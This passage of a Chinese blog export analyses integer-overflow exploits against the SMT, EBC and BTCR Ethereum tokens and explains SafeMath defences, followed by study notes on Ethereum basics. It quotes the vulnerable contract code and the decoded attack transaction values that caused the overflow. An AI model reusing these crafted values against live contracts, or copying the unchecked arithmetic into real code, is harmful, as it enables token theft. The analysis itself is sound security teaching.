<h2 id="0x01-SMT"><a href="#0x01-SMT" class="headerlink" title="0x01 SMT"></a>0x01 SMT</h2><p>在etherscan上的地址为：<a href="https://etherscan.io/address/0x55f93985431fc9304077687a35a1ba103dc1e081#code">https://etherscan.io/address/0x55f93985431fc9304077687a35a1ba103dc1e081#code</a></p>
<p>攻击记录：<a href="https://etherscan.io/tx/0x1abab4c8db9a30e703114528e31dee129a3a758f7f8abc3b6494aad3d304e43f">https://etherscan.io/tx/0x1abab4c8db9a30e703114528e31dee129a3a758f7f8abc3b6494aad3d304e43f</a></p>
<p>存在溢出漏洞的合约代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">transferProxy</span>(<span class="params">address _from, address _to, uint256 _value, uint256 _feeSmt,</span></span></span><br><span class="line"><span class="function"><span class="params">        uint8 _v,bytes32 _r, bytes32 _s</span>) <span class="title">public</span> <span class="title">transferAllowed</span>(<span class="params">_from</span>) <span class="title">returns</span> (<span class="params">bool</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(balances[_from] &lt; _feeSmt + _value) revert(); <span class="comment">//溢出点，这里存在整数加法溢出</span></span><br><span class="line"></span><br><span class="line">        uint256 nonce = nonces[_from];</span><br><span class="line">        bytes32 h = keccak256(_from,_to,_value,_feeSmt,nonce);</span><br><span class="line">        <span class="keyword">if</span>(_from != ecrecover(h,_v,_r,_s)) revert();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(balances[_to] + _value &lt; balances[_to]</span><br><span class="line">            || balances[msg.sender] + _feeSmt &lt; balances[msg.sender]) revert();</span><br><span class="line">        balances[_to] += _value;</span><br><span class="line">        Transfer(_from, _to, _value);</span><br><span class="line"></span><br><span class="line">        balances[msg.sender] += _feeSmt;</span><br><span class="line">        Transfer(_from, msg.sender, _feeSmt);</span><br><span class="line"></span><br><span class="line">        balances[_from] -= _value + _feeSmt;</span><br><span class="line">        nonces[_from] = nonce + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>函数分析：</p>
<ul>
<li><p>实现可以签名的转账功能</p>
</li>
<li><p>判断发送者的balances是否小于fee与value的和，如果小于就revert，就是如果发送者的balances大fee与value的和就继续往下执行。这里因为_value,_feeSmt两个参数可控，可以构造两个大叔造成加法溢出</p>
</li>
<li>ecrecover是对函数的签名进行验证</li>
<li>判断_value与_feeSmt是否为零</li>
<li>执行转账，同时改变转账账户和接收账户的余额，交易次数加一</li>
</ul>
<p>分析交易详情</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>: transferProxy(address _from, address _to, uint256 _value, uint256 _feeSmt, uint8 _v, bytes32 _r, bytes32 _s)</span><br><span class="line"></span><br><span class="line">MethodID: <span class="number">0xeb502d45</span></span><br><span class="line">[<span class="number">0</span>]:  000000000000000000000000df31a499a5a8358b74564f1e2214b31bb34eb46f</span><br><span class="line">[<span class="number">1</span>]:  000000000000000000000000df31a499a5a8358b74564f1e2214b31bb34eb46f</span><br><span class="line">[<span class="number">2</span>]:  8fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span><br><span class="line">[<span class="number">3</span>]:  <span class="number">7000000000000000000000000000000000000000000000000000000000000001</span></span><br><span class="line">[<span class="number">4</span>]:  000000000000000000000000000000000000000000000000000000000000001b</span><br><span class="line">[<span class="number">5</span>]:  87790587c256045860b8fe624e5807a658424fad18c2348460e40ecf10fc8799</span><br><span class="line">[<span class="number">6</span>]:  6c879b1e8a0a62f23b47aa57a3369d416dd783966bd1dda0394c04163a98d8d8</span><br></pre></td></tr></table></figure>
<p>可以明显的看到_value, _feeSmt两个都很大，相加起来等于</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0x10000000000000000000000000000000000000000000000000000000000000000</span></span><br></pre></td></tr></table></figure>
<p>超出了uint256能储存的范围，产生了上溢，导致_feeSmt + _value变成了0，从而绕过了余额的检查，导致了恶意转账的发生</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">0x8fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span>=</span><br><span class="line"><span class="number">65133050195990359925758679067386948167464366374422817272194891004451135422463</span></span><br><span class="line"><span class="number">0x7000000000000000000000000000000000000000000000000000000000000001</span>=</span><br><span class="line"><span class="number">50659039041325835497812305941300959685805618291217746767262693003461994217473</span></span><br></pre></td></tr></table></figure>
<p>发生的转账</p>
<p><img src="/2021/06/07/15/image-20210603173641183.png" alt></p>
<p>当时的市价约为0.7元…..然后那哥们对着UGT又玩了一次。</p>
<p><img src="/2021/06/07/15/image-20210603173652037.png" alt></p>
<h2 id="0x02-EBC"><a href="#0x02-EBC" class="headerlink" title="0x02 EBC"></a>0x02 EBC</h2><p>在etherscan上的地址为：<a href="https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code">https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code</a> </p>
<p>攻击记录：<a href="https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f">https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f</a></p>
<p>存在溢出漏洞的合约代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">batchTransfer</span>(<span class="params">address[] _receivers, uint256 _value</span>) <span class="title">public</span> <span class="title">whenNotPaused</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    uint cnt = _receivers.length;</span><br><span class="line">    uint256 amount = uint256(cnt) * _value; <span class="comment">//溢出点，这里存在整数乘法溢出</span></span><br><span class="line">    <span class="built_in">require</span>(cnt &gt; <span class="number">0</span> &amp;&amp; cnt &lt;= <span class="number">20</span>);</span><br><span class="line">    <span class="built_in">require</span>(_value &gt; <span class="number">0</span> &amp;&amp; balances[msg.sender] &gt;= amount);</span><br><span class="line"></span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(amount);</span><br><span class="line">    <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; cnt; i++) &#123;</span><br><span class="line">        balances[_receivers[i]] = balances[_receivers[i]].add(_value);</span><br><span class="line">        Transfer(msg.sender, _receivers[i], _value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>函数分析：</p>
<ul>
<li>实现的是批量转账功能，接收的参数是地址数组和转账金额</li>
<li>_value由用户控制，可以实现cnt * _value &gt; 2^256 - 1使得 amount置零</li>
<li>使用require语句对地址数组和账户余额进行判断</li>
<li>通过上述判断之后，对地址数组里面的地址转账</li>
</ul>
<p>分析交易详情</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>: batchTransfer(address[] _receivers, uint256 _value)MethodID: <span class="number">0x83f12fec</span>[<span class="number">0</span>]:  <span class="number">0000000000000000000000000000000000000000000000000000000000000040</span>[<span class="number">1</span>]:  <span class="number">8000000000000000000000000000000000000000000000000000000000000000</span>[<span class="number">2</span>]:  <span class="number">0000000000000000000000000000000000000000000000000000000000000002</span>[<span class="number">3</span>]:  000000000000000000000000b4d30cac5124b46c2df0cf3e3e1be05f42119033[<span class="number">4</span>]:  0000000000000000000000000e823ffe018727585eaf5bc769fa80472f76c3d7</span><br></pre></td></tr></table></figure>
<p>这里涉及到区块链的参数编码，可以参考PIKACHU师傅的<a href="https://hitcxy.com/2021/argument-encoding/">文章</a></p>
<p>可以看到此时的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">_receivers.length=2_value=<span class="number">8000000000000000000000000000000000000000000000000000000000000000</span></span><br></pre></td></tr></table></figure>
<p>两者相乘得到2^256，超出uint256能储存的范围，产生了上溢，导致amount变成了零，从而绕过了第二个语句对账户余额的判断。</p>
<p>发生的转账</p>
<p><img src="/2021/06/07/15/image-20210603211027336.png" alt="image-20210603211027336"></p>
<h2 id="0x03-BTCR"><a href="#0x03-BTCR" class="headerlink" title="0x03 BTCR"></a>0x03 BTCR</h2><p>在etherscan上的地址为：<a href="https://etherscan.io/address/0x6aac8cb9861e42bf8259f5abdc6ae3ae89909e11#code">https://etherscan.io/address/0x6aac8cb9861e42bf8259f5abdc6ae3ae89909e11#code</a></p>
<p>存在溢出漏洞的合约代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">distributeBTR</span>(<span class="params">address[] addresses</span>) <span class="title">onlyOwner</span> </span>&#123;    <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; addresses.length; i++) &#123;        balances[owner] -= <span class="number">2000</span> * <span class="number">10</span>**<span class="number">8</span>;        balances[addresses[i]] += <span class="number">2000</span> * <span class="number">10</span>**<span class="number">8</span>;        Transfer(owner, addresses[i], <span class="number">2000</span> * <span class="number">10</span>**<span class="number">8</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>函数分析：</p>
<ul>
<li>实现代币的批量分配，但是只能转账固定的数额</li>
<li>每分配一次，就减去相应的数值</li>
</ul>
<p>攻击分析：</p>
<p>由于合约部署的时候将onlyOwner设置为合约人的账户地址，所以该漏洞只有Owner可以利用</p>
<ul>
<li>因为没有判断Owner的账户是否有足够的余额，所以导致了减法的整型下溢出</li>
<li>在部署时，balances[owner] = 21000000 * 10^8，也就是说最多执行10500次Transfer()就会产生下溢出</li>
<li>这样会导致改代币严重的供给关系失衡，导致代币市值严重下跌</li>
</ul>
<h1 id="0x05-防御方式"><a href="#0x05-防御方式" class="headerlink" title="0x05 防御方式"></a>0x05 防御方式</h1><h2 id="0x01-算术运算前后验证"><a href="#0x01-算术运算前后验证" class="headerlink" title="0x01 算术运算前后验证"></a>0x01 算术运算前后验证</h2><ul>
<li>加法运算的和一定大于加数和被加数</li>
<li>乘法运算的积一定大于乘数和被乘数</li>
<li>减法运算的差一定小于两者的和，或者至少小于其中一个</li>
</ul>
<h2 id="0x02-SafeMath"><a href="#0x02-SafeMath" class="headerlink" title="0x02 SafeMath"></a>0x02 SafeMath</h2><p>SafeMath时OpenZeppelin 维护的一套智能合约函数库中用来处理算术逻辑的函数库</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.25</span>;library SafeMath &#123;  <span class="function"><span class="keyword">function</span> <span class="title">mul</span>(<span class="params">uint256 a, uint256 b</span>) <span class="title">internal</span> <span class="title">constant</span> <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123;    uint256 c = a * b;    assert(a == <span class="number">0</span> || c / a == b);    <span class="keyword">return</span> c;  &#125;  <span class="function"><span class="keyword">function</span> <span class="title">div</span>(<span class="params">uint256 a, uint256 b</span>) <span class="title">internal</span> <span class="title">constant</span> <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123;    uint256 c = a / b;    <span class="keyword">return</span> c;  &#125;  <span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params">uint256 a, uint256 b</span>) <span class="title">internal</span> <span class="title">constant</span> <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123;    assert(b &lt;= a);    <span class="keyword">return</span> a - b;  &#125;  <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">uint256 a, uint256 b</span>) <span class="title">internal</span> <span class="title">constant</span> <span class="title">returns</span> (<span class="params">uint256</span>) </span>&#123;    uint256 c = a + b;    assert(c &gt;= a);    <span class="keyword">return</span> c;  &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>再次演示，为了方便展示结果，使用uint8</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract OverFlow &#123;    using SafeMath <span class="keyword">for</span> uint8;    <span class="comment">//加法溢出    function add_overflow() returns (uint8 _overflow) &#123;        uint8 max =2**8 - 1;        return max.add(1);    &#125;         //乘法溢出	function mul_overflow() returns (uint8 _underflow) &#123;    	uint8 mul = 2**7;    	return mul.mul(2);	&#125;	//减法溢出	function sub_underflow() returns (uint8 _underflow) &#123;    	uint8 min = 0;    	return min.sub(1);	&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>部署成功后，此时不论调用哪个函数都会报错。</p>
<p><img src="/2021/06/07/15/image-20210603224552253.png" alt="image-20210603224552253"></p>
<h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>开发智能合约时，如果不严格检查用户的输入的话，会将用户的输入带入执行计算，这就有可能带来安全风险。同时在前面案例分析中，SMT和EBC合约源码中有使用SafeMth，但是在运算忘记添加，导致了漏洞的发生。由于区块链的不可篡改性质，一旦部署上链的合约无法进行漏洞修复。虽然可以通过拉黑ETH地址的方式阻止攻击者提现，但是是在攻击发现后，依旧无法阻止在未发现攻击行为之前攻击者短时间的大额提现。</p>
]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>智能合约安全</tag>
      </tags>
  </entry>
  <entry>
    <title>读《以太坊技术详解与实战》笔记</title>
    <url>/2021/03/21/13/</url>
    <content><![CDATA[<h1 id="读《以太坊技术详解与实战》笔记）"><a href="#读《以太坊技术详解与实战》笔记）" class="headerlink" title="读《以太坊技术详解与实战》笔记）"></a>读《以太坊技术详解与实战》笔记）</h1><h2 id="整体目录"><a href="#整体目录" class="headerlink" title="整体目录"></a>整体目录</h2><p><img src="/2021/03/21/13/image-20210319171504700.png" alt="image-20210319171504700"></p>
<h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h3 id="理解区块链"><a href="#理解区块链" class="headerlink" title="理解区块链"></a>理解区块链</h3><p>定义：区块链是一种分布式，去中心化的计算与存储架构</p>
<ul>
<li><p>区块链解决什么：如何用一种可信赖的方式记录数据，使得用户可以信任区块链系统记录的数据而无需假设节点的可信性</p>
</li>
<li><p>三个部分：区块链的数据结构、分布式存储、一致性协议</p>
<ul>
<li>数据结构</li>
</ul>
<p><img src="/2021/03/21/13/image-20210319172138759.png" alt="image-20210319172138759"></p>
<ul>
<li>分布式存储</li>
</ul>
<p>系统中各个节点组成一个P2P网络，每个节点均分别执行、验证和记录相同的交易，每个节点都可以在本地存储完整的区块链数据</p>
<ul>
<li>一致性协议<ul>
<li>POW</li>
<li>POS</li>
<li>DPOS</li>
<li>EOS</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="以太坊"><a href="#以太坊" class="headerlink" title="以太坊"></a>以太坊</h3><ul>
<li>一种能够被重编程用以实现任意复杂计算功能的单一区块链</li>
<li>用户可以直接开发自己的区块链应用，而无需担心底层的区块链系统</li>
<li>对比比特币的优点<ul>
<li>更快的的出块速度以及更先进的奖励机制</li>
<li>以太坊支持智能合约，用户可以自定义数字资产和流通逻辑，可以执行任何计算，但是比特币只支持转账</li>
</ul>
</li>
<li>以太坊发送的交易不仅仅是金额还可以是调用一段代码</li>
</ul>
<h4 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h4><ul>
<li>合约创建</li>
<li>合约调用</li>
</ul>
<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4><ul>
<li>时间戳和溯源：由于数据区块持续增长且不可篡改，所以可以证明过去某个时间发生过某件事</li>
<li>数字资产的发行和流通：采取统一标准（如ERC20）使得不同商户资产实现流通，比如Q币与支付宝流通</li>
<li>跨组织的数据共享：涉及多家方参与的项目，利用检测自动完成交易或则违约支付</li>
</ul>
<h4 id="DAPP"><a href="#DAPP" class="headerlink" title="DAPP"></a>DAPP</h4><ul>
<li>去中心化应用（ Decentralized Application, DA pp ）是一种运行在去中心化点对点（P2P) 网络上的应用软件。</li>
<li>相比于现有中心化软件优点<ul>
<li>项目开源，公开透明</li>
<li>去中心化</li>
<li>具有激励机制</li>
</ul>
</li>
</ul>
<p>实例</p>
<ol>
<li>Golem</li>
<li>CryptoKittes</li>
<li>Augur</li>
<li>Bancor</li>
<li>KyberNetwork</li>
</ol>
<h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h3 id="以太坊整体架构"><a href="#以太坊整体架构" class="headerlink" title="以太坊整体架构"></a>以太坊整体架构</h3><ul>
<li>底层服务<ul>
<li>P2P网络服务</li>
<li>LevelDB数据库</li>
<li>密码学算法</li>
<li>分片（SHarding）优化</li>
</ul>
</li>
<li>核心层<ul>
<li>区块链</li>
<li>共识算法</li>
<li>以太坊虚拟机</li>
</ul>
</li>
<li>顶层应用<ul>
<li>API接口</li>
<li>智能合约</li>
<li>去中心化应用</li>
</ul>
</li>
<li>概括</li>
</ul>
<p><img src="/2021/03/21/13/image-20210319180616258.png" alt="image-20210319180616258"></p>
<p>底层服务中LevelDB数据库存储了交易、区块等数据，密码学算法为区块的生成、交易的传输等进行加密，分片优化加快了交易验证的速度，共识算法用于解决P2P网络节点之间账本的一致性，顶层应用中的去中心化应用需要在以太坊虚拟机上执行，各层结构相互协同又各司其职，共同组成一个完整的以太坊系统</p>
<h3 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h3><p>比特币区块</p>
<p><img src="/2021/03/21/13/AtcMoc9wnwc1hR3elozu.jpg" alt></p>
<p>以太坊区块</p>
<p><img src="/2021/03/21/13/6dc6f6b7cc29c9c0043fb979ce000fb2.png" alt="preview"></p>
<p>两张图对比学习</p>
<h3 id="账户"><a href="#账户" class="headerlink" title="账户"></a>账户</h3><h4 id="用户帐户"><a href="#用户帐户" class="headerlink" title="用户帐户"></a>用户帐户</h4><ul>
<li>地址</li>
<li>余额</li>
</ul>
<h4 id="智能合约账户"><a href="#智能合约账户" class="headerlink" title="智能合约账户"></a>智能合约账户</h4><p>智能合约是由事件驱动的、具有状态的、运行在一个可复制的、共享的账本之上的计算机程序，当满足特定条件时，智能合约会自动执行。合约一旦部署不可修改、合约执行后不可逆、所有执行事务可追踪。</p>
<ul>
<li>地址</li>
<li>余额</li>
<li>状态：智能合约中声明的所有变量和变量的当前状态</li>
<li>代码</li>
</ul>
<p><strong>地址是账户唯一标识</strong></p>
<p>智能合约能调用其他智能合约</p>
<h4 id="公钥和私钥"><a href="#公钥和私钥" class="headerlink" title="公钥和私钥"></a>公钥和私钥</h4><p><img src="/2021/03/21/13/v2-f8ecabfbfc415e64489ba0fad89fe4ae_720w.jpeg" alt="img"></p>
<p>32byte=256bits</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line">第一步：私钥 <span class="punctuation">(</span><span class="variable">private</span> <span class="variable">key</span><span class="punctuation">)</span></span><br><span class="line">　　伪随机数产生的<span class="number">256</span><span class="variable">bit</span>私钥示例<span class="punctuation">(</span><span class="number">256</span><span class="variable">bit</span>  <span class="number">16</span>进制<span class="number">32</span>字节<span class="punctuation">)</span></span><br><span class="line">　　<span class="number">18</span><span class="variable">e14a7b6a307f426a94f8114701e7c8e774e7f9a47e2c2035db29a206321725</span></span><br><span class="line">第二步：公钥 <span class="punctuation">(</span><span class="variable">public</span> <span class="variable">key</span><span class="punctuation">)</span></span><br><span class="line">　　<span class="number">1.</span> 采用椭圆曲线数字签名算法<span class="variable">ECDSA</span><span class="operator">-</span><span class="variable">secp256k1</span>将私钥（<span class="number">32</span>字节）映射成公钥（<span class="number">65</span>字节）（前缀<span class="number">04</span><span class="operator">+</span><span class="variable">X</span>公钥<span class="operator">+</span><span class="variable">Y</span>公钥）：</span><br><span class="line">　　<span class="number">04</span></span><br><span class="line">　　<span class="number">50863</span><span class="variable">ad64a87ae8a2fe83c1af1a8403cb53f53e486d8511dad8a04887e5b2352</span></span><br><span class="line">　　<span class="number">2</span><span class="variable">cd470243453a299fa9e77237716103abc11a1df38855ed6f2ee187e9c582ba6</span></span><br><span class="line">　　<span class="number">2.</span> 拿公钥（非压缩公钥）来<span class="variable">hash</span>，计算公钥的 <span class="variable">Keccak</span><span class="operator">-</span><span class="number">256</span> 哈希值（<span class="number">32</span><span class="variable">bytes</span>）：</span><br><span class="line">　　<span class="variable">fc12ad814631ba689f7abe671016f75c54c607f082ae6b0881fac0abeda21781</span></span><br><span class="line">　　<span class="number">3.</span> 取上一步结果取后<span class="number">20</span><span class="variable">bytes</span>即以太坊地址：</span><br><span class="line">　　<span class="number">1016</span><span class="variable">f75c54c607f082ae6b0881fac0abeda21781</span></span><br><span class="line">第三步：地址 <span class="punctuation">(</span><span class="variable">address</span><span class="punctuation">)</span></span><br><span class="line">　　<span class="number">0</span><span class="variable">x1016f75c54c607f082ae6b0881fac0abeda21781</span></span><br></pre></td></tr></table></figure>
<h3 id="数据结构与储存"><a href="#数据结构与储存" class="headerlink" title="数据结构与储存"></a>数据结构与储存</h3><ul>
<li><a href="https://zhuanlan.zhihu.com/p/133718794">数据组织形式</a><ul>
<li>Merkle Patircia树（MPT）</li>
<li>Merkle树</li>
<li>Trie树</li>
</ul>
</li>
<li>状态树：代表访问区块后的整个状态<ul>
<li>{nonce,balance,code,stroge}</li>
</ul>
</li>
<li>交易树：键值对，每个键是交易编号，值是交易内容</li>
<li>收据树：RLP编码的数据结构 [medstate,Gas_used,logbloom,logs(address,[topic1,topic2])]</li>
</ul>
<h3 id="数据库支持"><a href="#数据库支持" class="headerlink" title="数据库支持"></a>数据库支持</h3><p><img src="/2021/03/21/13/image-20210319210450301.png" alt="image-20210319210450301"></p>
<h3 id="共识机制"><a href="#共识机制" class="headerlink" title="共识机制"></a>共识机制</h3><h4 id="POW"><a href="#POW" class="headerlink" title="POW"></a>POW</h4><p>工作结果证明你完成相应的工作</p>
<h4 id="POS"><a href="#POS" class="headerlink" title="POS"></a>POS</h4><p>基于网络参与者目前持有的数字货币的数量与时间进行利益分配</p>
<p>拜占庭将军问题</p>
<h3 id="以太币"><a href="#以太币" class="headerlink" title="以太币"></a>以太币</h3><p>ETH</p>
<ul>
<li>1eth=1e^18wei</li>
</ul>
<h3 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h3><ul>
<li>from：交易发送者的地址，必填</li>
<li>to：交易接收者地址，空则代表合约创建交易</li>
<li>value：发送者要转移的以太币数量</li>
<li>data：存在的数据字段，存在代表交易是创建合约或调用合约交易</li>
<li>Gas Limit：表示交易允许消耗的最大Gas数量</li>
<li>GasPrice：表示发送者愿意支付给矿工的Gas的价格</li>
<li>nonce：用来区别同一用户发出的不同交易标记</li>
<li>hash：以上信息生成的散列值，作为交易ID</li>
<li>r、s、v：交易签名，发送者的私钥对交易hash进行签名生成</li>
</ul>
<h4 id="以太坊交易（支持三种data区分）"><a href="#以太坊交易（支持三种data区分）" class="headerlink" title="以太坊交易（支持三种data区分）"></a>以太坊交易（支持三种data区分）</h4><h5 id="价值传递"><a href="#价值传递" class="headerlink" title="价值传递"></a>价值传递</h5><ul>
<li><strong>TO</strong> ：收款地址</li>
<li><strong>DATA</strong> ：留空或留言信息</li>
<li><strong>FROM</strong> ：谁发出</li>
<li><strong>AMOUNT</strong> ：发送多少</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">web3.eth.sendTransaction(&#123;</span><br><span class="line">    to: <span class="string">&#x27;0x687422eEA2cB73B5d3e242bA5456b782919AFc85&#x27;</span>,</span><br><span class="line">    value: <span class="number">0.0005</span></span><br><span class="line">    data: ‘0x’ // 也可以附加消息</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h5 id="创建合约"><a href="#创建合约" class="headerlink" title="创建合约"></a>创建合约</h5><ul>
<li><strong>TO</strong> ：留空 (这就是触发创建智能合约的原因)</li>
<li><strong>DATA</strong> ：包含编译为字节码的智能合约代码</li>
<li><strong>FROM</strong> ：谁创建</li>
<li><strong>AMOUNT</strong> ：可以是零或任何数量的以太，它是我们想要给合约的存款</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">web3.eth.sendTransaction(&#123;</span><br><span class="line">    to: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    value: <span class="number">0.0</span></span><br><span class="line">    data: ‘0x6060604052341561000c57xlb60405160c0806……………’</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h5 id="调用合约函数"><a href="#调用合约函数" class="headerlink" title="调用合约函数"></a>调用合约函数</h5><ul>
<li><strong>TO</strong>： 目标合约账户地址</li>
<li><strong>DATA</strong>： 包含函数名称和参数 - 标识如何调用智能合约函数</li>
<li><strong>FROM</strong> ：谁调用</li>
<li><strong>AMOUNT</strong> ： 可以是零或任意数量的以太，例如可以支付合约服务费用</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">web3.eth.sendTransaction(&#123;</span><br><span class="line">    to: &#39;0x687422eEA2cB73B5d3e242bA5456b782919AFc85’, &#x2F;&#x2F;合约</span><br><span class="line">    value: 0.0</span><br><span class="line">    data: ‘0x6060604052341561000c57fe5b60405160c0806……………’</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><a href="https://learnblockchain.cn/2019/06/03/eth-txpool#%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%BA%A4%E6%98%93%E6%B5%81%E7%A8%8B">更详细的过程</a></p>
<h3 id="数据编码与压缩"><a href="#数据编码与压缩" class="headerlink" title="数据编码与压缩"></a>数据编码与压缩</h3><p><a href="https://www.jianshu.com/p/8b97b99b0a2f">RLP编码算法</a></p>
<h3 id="客户端与API"><a href="#客户端与API" class="headerlink" title="客户端与API"></a>客户端与API</h3><p><a href="https://learnblockchain.cn/eth/dev/api%E5%BA%93.html">API库</a></p>
<h3 id="以太坊域名服务"><a href="#以太坊域名服务" class="headerlink" title="以太坊域名服务"></a>以太坊域名服务</h3><p>ENS：使用户注册支持智能合约运行的域名和利用底层设 备标识符解析部分域名</p>
<p>通过竞拍获取</p>
<h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><h3 id="区块链类型"><a href="#区块链类型" class="headerlink" title="区块链类型"></a>区块链类型</h3><ul>
<li>私有链：指写入权限在某一个组织控制下的区块链，读权限可以公开或加以先知</li>
<li>联盟链：共识过程受到预选节点控制，由不同实体分别控制节点形成授权网络，非联盟节点，只能读取，无权参与共识达成过程<ul>
<li>Quorum</li>
</ul>
</li>
<li>公有链：主网和测试网，适用于虚拟货币、面向大众的电子商务</li>
</ul>
<p><img src="/2021/03/21/13/image-20210319221335842.png" alt="image-20210319221335842"></p>
<h3 id="安装部署以太坊"><a href="#安装部署以太坊" class="headerlink" title="安装部署以太坊"></a>安装部署以太坊</h3><p>此处与书中不同,采取图形化软件Ganache自动化部署</p>
<p>使用参见<a href="https://www.trufflesuite.com/docs/ganache/overview">官方文档</a></p>
<h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><h3 id="智能合约-1"><a href="#智能合约-1" class="headerlink" title="智能合约"></a>智能合约</h3><p>以太坊和智能合约本身只是一个工具，其具体实现的功能和特性由企业和开发者决定 理论上讲，任意计算复杂度的金融交互过程均可以由智能合约安全 自动地完成 除了金 融方面的应用，以太坊平台还可以在如财产登记、投票、智能交通、物联网等任何需要信 任、安全和性能兼顾的环境中进行部署和使用</p>
<h4 id="创建和调用"><a href="#创建和调用" class="headerlink" title="创建和调用"></a>创建和调用</h4><p><img src="/2021/03/21/13/image-20210319224147956.png" alt="image-20210319224147956"></p>
<h4 id="适用语言"><a href="#适用语言" class="headerlink" title="适用语言"></a>适用语言</h4><ul>
<li>Solidioty</li>
<li>Serpent</li>
<li>LLL</li>
</ul>
<h4 id="集成开发环境"><a href="#集成开发环境" class="headerlink" title="集成开发环境"></a>集成开发环境</h4><p>Remix</p>
<h4 id="存储方式"><a href="#存储方式" class="headerlink" title="存储方式"></a>存储方式</h4><ul>
<li>栈：以太坊虚拟机的底层运行机制</li>
<li><p>账户储存：作为账户的一个属性保存，与影片一样</p>
</li>
<li><p>内存：以太坊虚拟运行代码时临时分配的一块线性空间，合约调用结束自动释放</p>
</li>
</ul>
<h4 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h4><p><a href="https://ethervm.io/">指令集</a></p>
<h4 id="消息调用"><a href="#消息调用" class="headerlink" title="消息调用"></a>消息调用</h4><h3 id="solidity"><a href="#solidity" class="headerlink" title="solidity"></a>solidity</h3><p><a href="https://docs.soliditylang.org/en/v0.8.0/">英文文档</a></p>
<p><a href="https://solidity-cn.readthedocs.io/zh/develop/">中文文档</a></p>
<h2 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h2><h4 id="Remix"><a href="#Remix" class="headerlink" title="Remix"></a><a href="http://remix.ethereum.org/">Remix</a></h4><p><img src="/2021/03/21/13/image-20210319230247382.png" alt="image-20210319230247382"></p>
<p><a href="http://remix.hubwiz.com/">中文版</a></p>
<p><a href="https://www.jianshu.com/p/8e9882f626f0">简单使用</a></p>
<p><a href="https://remix-ide.readthedocs.io/en/latest/">官方文档</a></p>
